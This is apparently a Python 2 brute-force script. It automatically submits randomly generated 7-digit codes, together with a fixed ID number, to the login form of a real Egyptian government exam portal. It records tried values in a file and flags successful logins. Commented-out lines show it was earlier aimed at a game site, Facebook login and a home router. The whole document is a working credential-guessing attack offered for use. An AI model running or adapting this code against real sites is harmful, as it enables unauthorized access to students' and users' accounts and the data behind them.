
#import mechanicalsoup
import sys
import mechanize
import cookielib
import random
import os
r=("\033[1;31m")
g=("\033[1;32m")
y=("\033[1;33m")
b=("\033[1;34m")
c=("\033[1;36m")
def sem():
 print b
 print "      _ __ ___   __ ___  __"
 print "     | '_ ` _ \ / _` \ \/ /"
 print "     | | | | | | (_| |>  <"
 print "     |_| |_| |_|\__,_/_/\_\ "
 print "               || "
 print "               || "
 print "               ||        #########"
 print "               ||       # ali.max #"
 print "               ||        #########"
 print "               || "
 print "               \/ "
 print "               "
 print y,"  Egypt {010 / 011 / 012}   "
 print y,"  United States {98 / 62 }"
 print y,"  Yemen {7}"
 print y,"  Syria {9}"
 print y,"  Available {}"

 print g
#sem()







#kk = str(raw_input("Enter a number ------->"))
#hh = "----->"
hh = '2'
kk = "g"





def sls():
 
  global eeee

  eeee = str(random.randint(0,10))
#print eee
sls()
eee = eeee
#if "0770" in kk :

 #os.system('python2 op.py')

def pa():
# sls(eee)
#e----------------
# eeee = eee
# print eeee
# os.system("echo '"+eee+"' >> hhh.txt")

 global eee
 eee = str(random.randint(1111111,9999999))
#print eeee
#kkkk = str(raw_input("Enter a number ------->"))
 ffff = open("hhh.txt", "r")
 fffff = (ffff.read())
 if eee in fffff :
#  os.system("echo '"+eee+"' >> hhh.txt")
#  kk = str(raw_input("Enter a number ------->"))
#  ss()
  pa()
 else:
  os.system("echo '"+eee+"' >> hhh.txt")
#  kk = str(raw_input("Enter  number ------->"))
 # ss()
  opop()
  #print "ok"
   #print (f.read())

#----------------
#def ss():
 #kk = str(raw_input("Enteffr a number ------->"))
# sls()
 #sss = pa.aaa
 #print eee
 #kk = str(raw_input("Enteffr a number ------->"))
# pa()






def opop():
#email = str(raw_input("email"))
# sls()
 email = str(random.randint(1111111,9999999))
 gooo = "7625"+email
# go = kk + email
#password = str(raw_input("bass" ))
 password = str(random.randint(111111111,999999999))
# login = 'http://www.softnyx-mena.com/Member/Login.aspx?ReturnGame=http%3A%2F%2Fwolfteam.softnyx-mena.com%2F'
 login = 'http://gdepexams.emis.gov.eg/fany_sitting/'
 kk = "442519875"
 k = "7625831"
 #kk = int(random.randint(111111111,999999999))
 #k = int(random.randint(1111111,9999999))


# login = 'https://www.facebook.com/login.php?login_attempt=1'
# login = 'http://192.168.1.1/'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 basss = random.randint(11111111,99999999)

 br = mechanize.Browser()
 max = cookielib.LWPCookieJar()
# br.set_handle_robots(False)
#ali max mmpp
# br.set_handle_redirect(True)
# br.set_cookiejar(max)
# br.set_handle_equiv(True)
#python max 
# br.set_handle_referer(True)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
 br.addheaders = [('User-agent', random.choice(useragents))]
 site = br.open(login)
#payload5
 br.select_form(nr = 0)
 br.form['ctl00$ContentPlaceHolder1$TextBox1'] = kk
 br.form['ctl00$ContentPlaceHolder1$TextBox2'] = eee
 sub = br.submit()
 log = sub.geturl()
# print (log)
# print b,"Check===> ",r,password
# print b,"Check===> ",r,email

 if "http://gdepexams.emis.gov.eg/fany_sitting/index.aspx" in log :
 #  print r,"good ---------> ",r,password
 #  print r,"good ---------> ",r,email
   print r,"no",eee
   os.system("cat hhh.txt | wc")
 # elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
 #  print ""
 else :
  print g,"good ---------> ",c,kk
  print g,"good ---------> ",c,eee
  os.system("cat hhh.txt | wc")
  os.system(" echo '"+email+"' >> "+"alii.txt")
  os.system(" echo '"+"-----------"+"' >> "+"alii.txt")

  str(raw_input("Enter a number ------->"))
 pa()
eee = eee
pa()
